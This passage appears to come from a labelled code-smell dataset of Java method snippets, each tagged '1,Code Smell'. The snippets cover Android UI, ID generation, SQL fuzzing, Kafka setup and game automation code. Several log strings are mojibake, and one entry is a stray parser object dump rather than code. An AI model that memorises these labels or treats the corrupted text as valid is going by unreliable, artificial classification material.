 else {
          mProgressNumber.setText("""");
        }
        if (mProgressPercentFormat != null) {
          double percent=(double)progress / (double)max;
          SpannableString tmp=new SpannableString(mProgressPercentFormat.format(percent));
          tmp.setSpan(new StyleSpan(android.graphics.Typeface.BOLD),0,tmp.length(),Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
          mProgressPercent.setText(tmp);
        }
 else {
          mProgressPercent.setText("""");
        }
      }
    }
;
    View view=inflater.inflate(R.layout.alert_dialog_progress_material,null);
    mProgress=(ProgressBar)view.findViewById(R.id.progress);
    mProgressNumber=(TextView)view.findViewById(R.id.progress_number);
    mProgressPercent=(TextView)view.findViewById(R.id.progress_percent);
    setView(view);
  }
 else {
    View view=inflater.inflate(R.layout.progress_dialog_material,null);
    mProgress=(ProgressBar)view.findViewById(R.id.progress);
    mMessageView=(TextView)view.findViewById(R.id.message);
    setView(view);
  }
  if (mMax > 0) {
    setMax(mMax);
  }
  if (mProgressVal > 0) {
    setProgress(mProgressVal);
  }
  if (mSecondaryProgressVal > 0) {
    setSecondaryProgress(mSecondaryProgressVal);
  }
  if (mIncrementBy > 0) {
    incrementProgressBy(mIncrementBy);
  }
  if (mIncrementSecondaryBy > 0) {
    incrementSecondaryProgressBy(mIncrementSecondaryBy);
  }
  if (mProgressDrawable != null) {
    setProgressDrawable(mProgressDrawable);
  }
  if (mIndeterminateDrawable != null) {
    setIndeterminateDrawable(mIndeterminateDrawable);
  }
  if (mMessage != null) {
    setMessage(mMessage);
  }
  setIndeterminate(mIndeterminate);
  onProgressChanged();
  super.onCreate(savedInstanceState);
}",1,Code Smell
"/** 
 * Static factory to retrieve a url-friendly, pseudo randomly generated, NanoId String. The generated NanoId String will have 21 symbols. The NanoId String is generated using a cryptographically strong pseudo random number generator.
 * @return A randomly generated NanoId String.
 */
public static String randomNanoId(){
  return randomNanoId(DEFAULT_NUMBER_GENERATOR,DEFAULT_ALPHABET,DEFAULT_SIZE);
}
/** 
 * Static factory to retrieve a url-friendly, pseudo randomly generated, NanoId String. The generated NanoId String will have 21 symbols. The NanoId String is generated using a cryptographically strong pseudo random number generator.
 * @param size The number of symbols in the NanoId String.
 * @return A randomly generated NanoId String.
 */
public static String randomNanoId(int size){
  return randomNanoId(DEFAULT_NUMBER_GENERATOR,DEFAULT_ALPHABET,size);
}
/** 
 * @param size The number of symbols in the NanoId String.
 * @param ids A group of ids generated.
 * @return A randomly generated NanoId String.
 */
public static String randomNanoId(int size,Set<String> ids){
  String newId=randomNanoId(size);
  if (ids.contains(newId)) {
    return randomNanoId(size,ids);
  }
 else {
    ids.add(newId);
    return newId;
  }
}
/** 
 * Static factory to retrieve a NanoId String. The string is generated using the given random number generator.
 * @param random The random number generator.
 * @param alphabet The symbols used in the NanoId String.
 * @param size The number of symbols in the NanoId String.
 * @return A randomly generated NanoId String.
 */
public static String randomNanoId(final Random random,final char[] alphabet,final int size){
  if (random == null) {
    throw new IllegalArgumentException(""random cannot be null."");
  }
  if (alphabet == null) {
    throw new IllegalArgumentException(""alphabet cannot be null."");
  }
  if (alphabet.length == 0 || alphabet.length >= 256) {
    throw new IllegalArgumentException(""alphabet must contain between 1 and 255 symbols."");
  }
  if (size <= 0) {
    throw new IllegalArgumentException(""size must be greater than zero."");
  }
  final int mask=(2 << (int)Math.floor(Math.log(alphabet.length - 1) / Math.log(2))) - 1;
  final int step=(int)Math.ceil(1.6 * mask * size / alphabet.length);
  final StringBuilder idBuilder=new StringBuilder();
  while (true) {
    final byte[] bytes=new byte[step];
    random.nextBytes(bytes);
    for (int i=0; i < step; i++) {
      final int alphabetIndex=bytes[i] & mask;
      if (alphabetIndex < alphabet.length) {
        idBuilder.append(alphabet[alphabetIndex]);
        if (idBuilder.length() == size) {
          return idBuilder.toString();
        }
      }
    }
  }
}",1,Code Smell
"private static void querySubplotsActivity(int taskRequire){
  try {
    String s=AntOrchardRpcCall.querySubplotsActivity(treeLevel);
    JSONObject jo=new JSONObject(s);
    if (""100"".equals(jo.getString(""resultCode""))) {
      JSONArray subplotsActivityList=jo.getJSONArray(""subplotsActivityList"");
      for (int i=0; i < subplotsActivityList.length(); i++) {
        jo=subplotsActivityList.getJSONObject(i);
        if (!""WISH"".equals(jo.getString(""activityType"")))         continue;
        String activityId=jo.getString(""activityId"");
        if (""NOT_STARTED"".equals(jo.getString(""status""))) {
          String extend=jo.getString(""extend"");
          jo=new JSONObject(extend);
          JSONArray wishActivityOptionList=jo.getJSONArray(""wishActivityOptionList"");
          String optionKey=null;
          for (int j=0; j < wishActivityOptionList.length(); j++) {
            jo=wishActivityOptionList.getJSONObject(j);
            if (taskRequire == jo.getInt(""taskRequire"")) {
              optionKey=jo.getString(""optionKey"");
              break;
            }
          }
          if (optionKey != null) {
            jo=new JSONObject(AntOrchardRpcCall.triggerSubplotsActivity(activityId,""WISH"",optionKey));
            if (""100"".equals(jo.getString(""resultCode""))) {
              Log.farm(""鍐滃満璁告効鉁╗姣忔棩鏂借偉"" + taskRequire + ""娆"");
            }
 else {
              Log.recordLog(jo.getString(""resultDesc""),jo.toString());
            }
          }
        }
 else         if (""FINISHED"".equals(jo.getString(""status""))) {
          jo=new JSONObject(AntOrchardRpcCall.receiveOrchardRights(activityId,""WISH""));
          if (""100"".equals(jo.getString(""resultCode""))) {
            Log.farm(""璁告効濂栧姳鉁╗鑲ユ枡"" + jo.getInt(""amount"") + ""g]"");
            querySubplotsActivity(taskRequire);
            return;
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""resultDesc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""triggerTbTask err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.contactsDidLoad) {
    if (emptyView != null) {
      emptyView.showProgress(false);
    }
    if (adapter != null) {
      adapter.notifyDataSetChanged();
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    if (listView != null) {
      int mask=(Integer)args[0];
      int count=listView.getChildCount();
      if ((mask & MessagesController.UPDATE_MASK_AVATAR) != 0 || (mask & MessagesController.UPDATE_MASK_NAME) != 0 || (mask & MessagesController.UPDATE_MASK_STATUS) != 0) {
        for (int a=0; a < count; a++) {
          View child=listView.getChildAt(a);
          if (child instanceof GroupCreateUserCell) {
            ((GroupCreateUserCell)child).update(mask);
          }
        }
      }
    }
  }
 else   if (id == NotificationCenter.chatDidCreated) {
    removeSelfFromStack();
  }
}",1,Code Smell
"/** 
 * Appends items using cached locations,  returning true if at least one item is appended and (oneColumnMode is true or reach limit and aboveIndex). This method should only be called by appendVisibleItems()
 */
protected final boolean appendVisbleItemsWithCache(int toLimit,boolean oneColumnMode){
  if (mLocations.size() == 0) {
    return false;
  }
  final int count=mProvider.getCount();
  int itemIndex;
  int edge;
  if (mLastVisibleIndex >= 0) {
    itemIndex=mLastVisibleIndex + 1;
    edge=mProvider.getEdge(mLastVisibleIndex);
  }
 else {
    edge=Integer.MAX_VALUE;
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    if (itemIndex > getLastIndex() + 1 || itemIndex < getFirstIndex()) {
      mLocations.clear();
      return false;
    }
 else     if (itemIndex > getLastIndex()) {
      return false;
    }
  }
  int lastIndex=getLastIndex();
  for (; itemIndex < count && itemIndex <= lastIndex; itemIndex++) {
    Location loc=getLocation(itemIndex);
    if (edge != Integer.MAX_VALUE) {
      edge=edge + loc.offset;
    }
    int rowIndex=loc.row;
    int size=mProvider.createItem(itemIndex,true,mTmpItem,false);
    if (size != loc.size) {
      loc.size=size;
      mLocations.removeFromEnd(lastIndex - itemIndex);
      lastIndex=itemIndex;
    }
    mLastVisibleIndex=itemIndex;
    if (mFirstVisibleIndex < 0) {
      mFirstVisibleIndex=itemIndex;
    }
    mProvider.addItem(mTmpItem[0],itemIndex,size,rowIndex,edge);
    if (!oneColumnMode && checkAppendOverLimit(toLimit)) {
      return true;
    }
    if (edge == Integer.MAX_VALUE) {
      edge=mProvider.getEdge(itemIndex);
    }
    if (rowIndex == mNumRows - 1) {
      if (oneColumnMode) {
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"public static SQLQueryAdapter createSequence(YSQLGlobalState globalState){
  ExpectedErrors errors=new ExpectedErrors();
  StringBuilder sb=new StringBuilder(""CREATE"");
  if (Randomly.getBoolean()) {
    sb.append("" "");
    sb.append(Randomly.fromOptions(""TEMPORARY"",""TEMP""));
  }
  sb.append("" SEQUENCE"");
  sb.append("" IF NOT EXISTS"");
  sb.append("" seq"");
  if (Randomly.getBoolean()) {
    sb.append("" AS "");
    sb.append(Randomly.fromOptions(""smallint"",""integer"",""bigint""));
  }
  if (Randomly.getBoolean()) {
    sb.append("" INCREMENT"");
    if (Randomly.getBoolean()) {
      sb.append("" BY"");
    }
    sb.append("" "");
    sb.append(globalState.getRandomly().getInteger());
    errors.add(""INCREMENT must not be zero"");
  }
  if (Randomly.getBoolean()) {
    if (Randomly.getBoolean()) {
      sb.append("" MINVALUE"");
      sb.append("" "");
      sb.append(globalState.getRandomly().getInteger());
    }
 else {
      sb.append("" NO MINVALUE"");
    }
    errors.add(""must be less than MAXVALUE"");
  }
  if (Randomly.getBoolean()) {
    if (Randomly.getBoolean()) {
      sb.append("" MAXVALUE"");
      sb.append("" "");
      sb.append(globalState.getRandomly().getInteger());
    }
 else {
      sb.append("" NO MAXVALUE"");
    }
    errors.add(""must be less than MAXVALUE"");
  }
  if (Randomly.getBoolean()) {
    sb.append("" START"");
    if (Randomly.getBoolean()) {
      sb.append("" WITH"");
    }
    sb.append("" "");
    sb.append(globalState.getRandomly().getInteger());
    errors.add(""cannot be less than MINVALUE"");
    errors.add(""cannot be greater than MAXVALUE"");
  }
  if (Randomly.getBoolean()) {
    sb.append("" CACHE "");
    sb.append(globalState.getRandomly().getPositiveIntegerNotNull());
  }
  errors.add(""is out of range"");
  if (Randomly.getBoolean()) {
    if (Randomly.getBoolean()) {
      sb.append("" NO"");
    }
    sb.append("" CYCLE"");
  }
  if (Randomly.getBoolean()) {
    sb.append("" OWNED BY "");
    sb.append(""NONE"");
  }
  return new SQLQueryAdapter(sb.toString(),errors);
}
",1,Code Smell
"void parse(WorkspaceDslContext context,File dslFile,Tokens tokens){
  parse(context,context.getWorkspace(),dslFile,tokens);
}
void parse(SoftwareSystemDslContext context,File dslFile,Tokens tokens){
  parse(context,context.getSoftwareSystem(),dslFile,tokens);
}
void parse(ContainerDslContext context,File dslFile,Tokens tokens){
  parse(context,context.getContainer(),dslFile,tokens);
}
void parse(ComponentDslContext context,File dslFile,Tokens tokens){
  parse(context,context.getComponent(),dslFile,tokens);
}
private void parse(DslContext context,Documentable documentable,File dslFile,Tokens tokens){
  if (tokens.hasMoreThan(FQN_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(PATH_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  String fullyQualifiedClassName=DEFAULT_DECISION_IMPORTER;
  if (tokens.includes(FQN_INDEX)) {
    fullyQualifiedClassName=tokens.get(FQN_INDEX);
  }
  if (dslFile != null) {
    File path=new File(dslFile.getParentFile(),tokens.get(PATH_INDEX));
    if (!path.exists()) {
      throw new RuntimeException(""Documentation path "" + path + "" does not exist"");
    }
    if (!path.isDirectory()) {
      throw new RuntimeException(""Documentation path "" + path + "" is not a directory"");
    }
    try {
      Class decisionImporterClass=context.loadClass(fullyQualifiedClassName,dslFile);
      Constructor constructor=decisionImporterClass.getDeclaredConstructor();
      DocumentationImporter decisionImporter=(DocumentationImporter)constructor.newInstance();
      decisionImporter.importDocumentation(documentable,path);
      if (!tokens.includes(FQN_INDEX)) {
        DefaultImageImporter imageImporter=new DefaultImageImporter();
        imageImporter.importDocumentation(documentable,path);
      }
    }
 catch (    ClassNotFoundException cnfe) {
      throw new RuntimeException(""Error importing ADRs from "" + path.getAbsolutePath() + "": ""+ fullyQualifiedClassName+ "" was not found"");
    }
catch (    Exception e) {
      throw new RuntimeException(""Error importing ADRs from "" + path.getAbsolutePath() + "": ""+ e.getMessage());
    }
  }
}
",1,Code Smell
"private ModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ModelProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@29c1394",1,Code Smell
"private static @NotNull CloudGeometry rebuildGeometry(@Nullable CloudGeometry existingGeometry,CloudGeometryParameters parameters,CloudTextureData textureData){
  BufferBuilder bufferBuilder=Tesselator.getInstance().getBuilder();
  bufferBuilder.begin(VertexFormat.Mode.QUADS,DefaultVertexFormat.POSITION_COLOR);
  var writer=VertexBufferWriter.of(bufferBuilder);
  var originCellX=parameters.originX();
  var originCellZ=parameters.originZ();
  var orientation=parameters.orientation();
  var radius=parameters.radius();
  var useFastGraphics=parameters.renderMode() == CloudStatus.FAST;
  addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,0,0,orientation,useFastGraphics);
  for (int layer=1; layer <= radius; layer++) {
    for (int z=-layer; z < layer; z++) {
      int x=Math.abs(z) - layer;
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
    for (int z=layer; z > -layer; z--) {
      int x=layer - Math.abs(z);
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
  }
  for (int layer=radius + 1; layer <= 2 * radius; layer++) {
    int l=layer - radius;
    for (int z=-radius; z <= -l; z++) {
      int x=-z - layer;
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
    for (int z=l; z <= radius; z++) {
      int x=z - layer;
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
    for (int z=radius; z >= l; z--) {
      int x=layer - z;
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
    for (int z=-l; z >= -radius; z--) {
      int x=layer + z;
      addCellGeometryToBuffer(writer,textureData,originCellX,originCellZ,x,z,orientation,useFastGraphics);
    }
  }
  BufferBuilder.RenderedBuffer builtBuffer=bufferBuilder.end();
  VertexBuffer vertexBuffer;
  if (existingGeometry != null) {
    vertexBuffer=existingGeometry.vertexBuffer();
  }
 else {
    vertexBuffer=new VertexBuffer(VertexBuffer.Usage.DYNAMIC);
  }
  uploadToVertexBuffer(vertexBuffer,builtBuffer);
  return new CloudGeometry(vertexBuffer,parameters);
}",1,Code Smell
"protected FlinkKafkaConsumer<RowData> createKafkaConsumer(DeserializationSchema<RowData> keyDeserialization,DeserializationSchema<RowData> valueDeserialization,TypeInformation<RowData> producedTypeInfo,String inlongMetric,String auditHostAndPorts,String auditKeys){
  final MetadataConverter[] metadataConverters=metadataKeys.stream().map(k -> Stream.of(ReadableMetadata.values()).filter(rm -> rm.key.equals(k)).findFirst().orElseThrow(IllegalStateException::new)).map(m -> m.converter).toArray(MetadataConverter[]::new);
  final boolean hasMetadata=metadataKeys.size() > 0;
  final int adjustedPhysicalArity=producedDataType.getChildren().size() - metadataKeys.size();
  final int[] adjustedValueProjection=IntStream.concat(IntStream.of(valueProjection),IntStream.range(keyProjection.length + valueProjection.length,adjustedPhysicalArity)).toArray();
  final KafkaDeserializationSchema<RowData> kafkaDeserializer=new DynamicKafkaDeserializationSchema(adjustedPhysicalArity,keyDeserialization,keyProjection,valueDeserialization,adjustedValueProjection,hasMetadata,metadataConverters,producedTypeInfo,upsertMode,dirtyOptions,dirtySink);
  final FlinkKafkaConsumer<RowData> kafkaConsumer;
  if (topics != null) {
    kafkaConsumer=new FlinkKafkaConsumer<>(topics,kafkaDeserializer,properties,inlongMetric,auditHostAndPorts,auditKeys);
  }
 else {
    kafkaConsumer=new FlinkKafkaConsumer<>(topicPattern,kafkaDeserializer,properties,inlongMetric,auditHostAndPorts,auditKeys);
  }
switch (startupMode) {
case EARLIEST:
    kafkaConsumer.setStartFromEarliest();
  break;
case LATEST:
kafkaConsumer.setStartFromLatest();
break;
case GROUP_OFFSETS:
kafkaConsumer.setStartFromGroupOffsets();
break;
case SPECIFIC_OFFSETS:
kafkaConsumer.setStartFromSpecificOffsets(specificStartupOffsets);
break;
case TIMESTAMP:
kafkaConsumer.setStartFromTimestamp(startupTimestampMillis);
break;
}
kafkaConsumer.setCommitOffsetsOnCheckpoints(properties.getProperty(""group.id"") != null);
if (watermarkStrategy != null) {
kafkaConsumer.assignTimestampsAndWatermarks(watermarkStrategy);
}
return kafkaConsumer;
}",1,Code Smell
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  if (m.getLeadingAnnotations().size() > 1) {
    m=m.withLeadingAnnotations(spaceBetweenAnnotations(m.getLeadingAnnotations()));
  }
  m=m.getPadding().withParameters(spaceBefore(m.getPadding().getParameters(),style.getBeforeParentheses().getMethodDeclaration()));
  if (m.getBody() != null) {
    m=m.withBody(spaceBefore(m.getBody(),style.getBeforeLeftBrace().getMethodLeftBrace()));
  }
  if (m.getParameters().isEmpty() || m.getParameters().iterator().next() instanceof J.Empty) {
    boolean useSpace=style.getWithin().getEmptyMethodDeclarationParentheses();
    m=m.getPadding().withParameters(m.getPadding().getParameters().getPadding().withElements(ListUtils.map(m.getPadding().getParameters().getPadding().getElements(),param -> param.withElement(spaceBefore(param.getElement(),useSpace)))));
  }
 else {
    final int paramsSize=m.getParameters().size();
    boolean useSpace=style.getWithin().getMethodDeclarationParentheses();
    m=m.getPadding().withParameters(m.getPadding().getParameters().getPadding().withElements(ListUtils.map(m.getPadding().getParameters().getPadding().getElements(),(index,param) -> {
      if (index == 0) {
        param=param.withElement(spaceBefore(param.getElement(),useSpace));
      }
 else {
        param=param.withElement(spaceBefore(param.getElement(),style.getOther().getAfterComma()));
      }
      if (index == paramsSize - 1) {
        param=spaceAfter(param,useSpace);
      }
 else {
        param=spaceAfter(param,style.getOther().getBeforeComma());
      }
      return param;
    }
)));
  }
  if (m.getAnnotations().getTypeParameters() != null) {
    boolean spaceWithinAngleBrackets=style.getWithin().getAngleBrackets();
    int typeParametersSize=m.getAnnotations().getTypeParameters().getTypeParameters().size();
    m=m.getAnnotations().withTypeParameters(m.getAnnotations().getTypeParameters().getPadding().withTypeParameters(ListUtils.map(m.getAnnotations().getTypeParameters().getPadding().getTypeParameters(),(index,elemContainer) -> {
      if (index == 0) {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),spaceWithinAngleBrackets));
      }
 else {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),style.getOther().getAfterComma()));
      }
      if (index == typeParametersSize - 1) {
        elemContainer=spaceAfter(elemContainer,spaceWithinAngleBrackets);
      }
      return elemContainer;
    }
)));
  }
  return m;
}",1,Code Smell
"private void onClickInternal(){
  if (!preparing || currentEntry == null) {
    return;
  }
  preparing=false;
  if (currentEntry.wouldBeVideo()) {
    downloadingVideo=true;
    toast=new PreparingVideoToast(getContext());
    toast.setOnCancelListener(() -> {
      preparing=false;
      if (buildingVideo != null) {
        buildingVideo.stop(true);
        buildingVideo=null;
      }
      if (toast != null) {
        toast.hide();
      }
      downloading=false;
      updateImage();
    }
);
    container.addView(toast);
    final File file=AndroidUtilities.generateVideoPath();
    buildingVideo=new BuildingVideo(currentAccount,currentEntry,file,() -> {
      if (!downloading || currentEntry == null) {
        return;
      }
      MediaController.saveFile(file.getAbsolutePath(),getContext(),1,null,null,uri -> {
        if (!downloading || currentEntry == null) {
          return;
        }
        toast.setDone(R.raw.ic_save_to_gallery,LocaleController.getString(""VideoSavedHint""),3500);
        downloading=false;
        updateImage();
        savedToGalleryUri=uri;
      }
,false);
    }
,progress -> {
      if (toast != null) {
        toast.setProgress(progress);
      }
    }
,() -> {
      if (!downloading || currentEntry == null) {
        return;
      }
      toast.setDone(R.raw.error,LocaleController.getString(""VideoConvertFail""),3500);
      downloading=false;
      updateImage();
    }
);
  }
 else {
    downloadingVideo=false;
    final File file=AndroidUtilities.generatePicturePath(false,""png"");
    if (file == null) {
      toast.setDone(R.raw.error,LocaleController.getString(""UnknownError""),3500);
      downloading=false;
      updateImage();
      return;
    }
    Utilities.themeQueue.postRunnable(() -> {
      currentEntry.buildPhoto(file);
      if (!downloading || currentEntry == null) {
        return;
      }
      AndroidUtilities.runOnUIThread(() -> {
        MediaController.saveFile(file.getAbsolutePath(),getContext(),0,null,null,uri -> {
          downloading=false;
          updateImage();
          if (toast != null) {
            toast.hide();
            toast=null;
          }
          toast=new PreparingVideoToast(getContext());
          toast.setDone(R.raw.ic_save_to_gallery,LocaleController.getString(""PhotoSavedHint""),2500);
          container.addView(toast);
          savedToGalleryUri=uri;
        }
,false);
      }
);
    }
);
  }
  updateImage();
}",1,Code Smell
"/** 
 * Finds a method with the given return type and parameter types.
 * @param clazz      the class to search in
 * @param returnType the return type of the method, or null to match any return type
 * @param withSuper  whether to search in superclasses
 * @param paramTypes the parameter types of the method
 * @return the method
 * @throws NoSuchMethodException if no matching method is found, or more than one matching method is found
 */
@NonNull public static Method findSingleMethod(@NonNull Class<?> clazz,@Nullable Class<?> returnType,boolean withSuper,@NonNull Class<?>... paramTypes) throws NoSuchMethodException {
  Objects.requireNonNull(clazz,""clazz == null"");
  int argc=paramTypes.length;
  Class<?> current=clazz;
  Method candidateMethod=null;
  do {
    Method[] methods=current.getDeclaredMethods();
    loop:     for (    Method method : methods) {
      if (returnType == null || returnType == method.getReturnType()) {
        Class<?>[] argt=method.getParameterTypes();
        if (argt.length == argc) {
          for (int ii=0; ii < argt.length; ii++) {
            if (!argt[ii].equals(paramTypes[ii])) {
              continue loop;
            }
          }
          if (candidateMethod != null) {
            throw new NoSuchMethodException(""Multiple methods "" + clazz.getName() + "".*""+ Arrays.toString(paramTypes)+ (returnType == null ? """" : "" with return type "" + returnType.getName())+ "" found"");
          }
 else {
            candidateMethod=method;
            candidateMethod.setAccessible(true);
          }
        }
      }
    }
    current=current.getSuperclass();
  }
 while ((candidateMethod == null && withSuper) && current != null && current != Object.class);
  if (candidateMethod == null) {
    throw new NoSuchMethodException(""No method "" + clazz.getName() + "".*""+ Arrays.toString(paramTypes)+ (returnType == null ? """" : "" with return type "" + returnType.getName())+ "" found"");
  }
  return candidateMethod;
}",1,Code Smell
"private void applySelectedTheme(){
  if (checkingBoostsLevel) {
    return;
  }
  if (boostsStatus != null && boostsStatus.level < chatActivity.getMessagesController().channelWallpaperLevelMin) {
    chatActivity.getMessagesController().getBoostsController().userCanBoostChannel(chatActivity.getDialogId(),boostsStatus,canApplyBoost -> {
      if (getContext() == null) {
        return;
      }
      LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(chatActivity,getContext(),LimitReachedBottomSheet.TYPE_BOOSTS_FOR_WALLPAPER,currentAccount,resourcesProvider);
      limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
      limitReachedBottomSheet.setBoostsStats(boostsStatus,true);
      limitReachedBottomSheet.setDialogId(chatActivity.getDialogId());
      limitReachedBottomSheet.showStatisticButtonInLink(() -> {
        TLRPC.Chat chat=chatActivity.getMessagesController().getChat(-chatActivity.getDialogId());
        showAsSheet(StatisticActivity.create(chat));
      }
);
      limitReachedBottomSheet.show();
    }
);
    return;
  }
  Bulletin bulletin=null;
  EmojiThemes newTheme=selectedItem.chatTheme;
  if (selectedItem != null && newTheme != currentTheme) {
    EmojiThemes chatTheme=selectedItem.chatTheme;
    String emoticon=!chatTheme.showAsDefaultStub ? chatTheme.getEmoticon() : null;
    ChatThemeController.getInstance(currentAccount).clearWallpaper(chatActivity.getDialogId(),false);
    ChatThemeController.getInstance(currentAccount).setDialogTheme(chatActivity.getDialogId(),emoticon,true);
    TLRPC.WallPaper wallpaper=hasChanges() ? null : themeDelegate.getCurrentWallpaper();
    if (!chatTheme.showAsDefaultStub) {
      themeDelegate.setCurrentTheme(chatTheme,wallpaper,true,originalIsDark);
    }
 else {
      themeDelegate.setCurrentTheme(null,wallpaper,true,originalIsDark);
    }
    isApplyClicked=true;
    TLRPC.User user=chatActivity.getCurrentUser();
    if (user != null && !user.self) {
      boolean themeDisabled=false;
      if (TextUtils.isEmpty(emoticon)) {
        themeDisabled=true;
        emoticon=""鉂�"";
      }
      TLRPC.Document document=emoticon != null ? MediaDataController.getInstance(currentAccount).getEmojiAnimatedSticker(emoticon) : null;
      StickerSetBulletinLayout layout=new StickerSetBulletinLayout(getContext(),null,StickerSetBulletinLayout.TYPE_EMPTY,document,chatActivity.getResourceProvider());
      layout.subtitleTextView.setVisibility(View.GONE);
      if (themeDisabled) {
        layout.titleTextView.setText(AndroidUtilities.replaceTags(LocaleController.formatString(""ThemeAlsoDisabledForHint"",R.string.ThemeAlsoDisabledForHint,user.first_name)));
      }
 else {
        layout.titleTextView.setText(AndroidUtilities.replaceTags(LocaleController.formatString(""ThemeAlsoAppliedForHint"",R.string.ThemeAlsoAppliedForHint,user.first_name)));
      }
      layout.titleTextView.setTypeface(null);
      bulletin=Bulletin.make(chatActivity,layout,Bulletin.DURATION_LONG);
    }
  }
  dismiss();
  if (bulletin != null) {
    bulletin.show();
  }
}
",1,Code Smell
"@Override public boolean dispatchKeyEvent(KeyEvent event){
  int keyCode=event.getKeyCode();
  if (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP || event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN) {
    BaseFragment baseFragment=getLastFragment();
    if (baseFragment != null && baseFragment.getLastStoryViewer() != null) {
      baseFragment.getLastStoryViewer().dispatchKeyEvent(event);
      return true;
    }
  }
  if (event.getAction() == KeyEvent.ACTION_DOWN && (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP || event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN)) {
    if (VoIPService.getSharedInstance() != null) {
      if (Build.VERSION.SDK_INT >= 32) {
        boolean oldValue=WebRtcAudioTrack.isSpeakerMuted();
        AudioManager am=(AudioManager)getSystemService(AUDIO_SERVICE);
        int minVolume=am.getStreamMinVolume(AudioManager.STREAM_VOICE_CALL);
        boolean mute=am.getStreamVolume(AudioManager.STREAM_VOICE_CALL) == minVolume && event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN;
        WebRtcAudioTrack.setSpeakerMute(mute);
        if (oldValue != WebRtcAudioTrack.isSpeakerMuted()) {
          showVoiceChatTooltip(mute ? UndoView.ACTION_VOIP_SOUND_MUTED : UndoView.ACTION_VOIP_SOUND_UNMUTED);
        }
      }
    }
 else     if (!mainFragmentsStack.isEmpty() && (!PhotoViewer.hasInstance() || !PhotoViewer.getInstance().isVisible()) && event.getRepeatCount() == 0) {
      BaseFragment fragment=mainFragmentsStack.get(mainFragmentsStack.size() - 1);
      if (fragment instanceof ChatActivity) {
        if (((ChatActivity)fragment).maybePlayVisibleVideo()) {
          return true;
        }
      }
      if (AndroidUtilities.isTablet() && !rightFragmentsStack.isEmpty()) {
        fragment=rightFragmentsStack.get(rightFragmentsStack.size() - 1);
        if (fragment instanceof ChatActivity) {
          if (((ChatActivity)fragment).maybePlayVisibleVideo()) {
            return true;
          }
        }
      }
    }
  }
  try {
    return super.dispatchKeyEvent(event);
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return false;
}",1,Code Smell
"private void setupBlockStateFunc(){
  if (arclight$spec.blockStateClass != null && !arclight$spec.blockStateClass.equalsIgnoreCase(""auto"")) {
    try {
      Class<?> cl=Class.forName(arclight$spec.blockStateClass);
      if (!CraftBlockState.class.isAssignableFrom(cl)) {
        throw LocalizedException.checked(""registry.block-state.not-subclass"",cl,CraftBlockState.class);
      }
      for (      Constructor<?> constructor : cl.getDeclaredConstructors()) {
        if (constructor.getParameterTypes().length == 1 && org.bukkit.block.Block.class.isAssignableFrom(constructor.getParameterTypes()[0])) {
          constructor.setAccessible(true);
          this.arclight$stateFunc=b -> {
            try {
              return (BlockState)constructor.newInstance(b);
            }
 catch (            Exception e) {
              throw new RuntimeException(e);
            }
          }
;
        }
      }
    }
 catch (    Exception e) {
      if (e instanceof LocalizedException) {
        ArclightServer.LOGGER.warn(((LocalizedException)e).node(),((LocalizedException)e).args());
      }
 else {
        ArclightServer.LOGGER.warn(""registry.block-state.error"",this,arclight$spec.blockStateClass,e);
      }
    }
    if (this.arclight$stateFunc == null) {
      ArclightServer.LOGGER.warn(""registry.block-state.no-candidate"",this,arclight$spec.blockStateClass);
    }
  }
  if (this.arclight$stateFunc == null) {
    this.arclight$stateFunc=CraftBlockStates::getBlockState;
  }
}",1,Code Smell
"private static void updateVariableData(@NonNull Context context,@NonNull List<App> modifiedApps){
  UriManager uriManager=new UriManager();
  ArrayMap<Integer,SsaidSettings> userIdSsaidSettingsMap=new ArrayMap<>();
  List<PackageUsageInfo> packageUsageInfoList=new ArrayList<>();
  boolean hasUsageAccess=FeatureController.isUsageAccessEnabled() && SelfPermissions.checkUsageStatsPermission();
  for (  int userId : Users.getUsersIds()) {
    if (ThreadUtils.isInterrupted())     return;
    if (hasUsageAccess) {
      List<PackageUsageInfo> usageInfoList=ExUtils.exceptionAsNull(() -> AppUsageStatsManager.getInstance().getUsageStats(UsageUtils.USAGE_WEEKLY,userId));
      if (usageInfoList != null) {
        packageUsageInfoList.addAll(usageInfoList);
      }
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      try {
        userIdSsaidSettingsMap.put(userId,new SsaidSettings(userId));
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
  }
  for (  App app : modifiedApps) {
    if (!app.isInstalled && !app.isSystemApp()) {
      continue;
    }
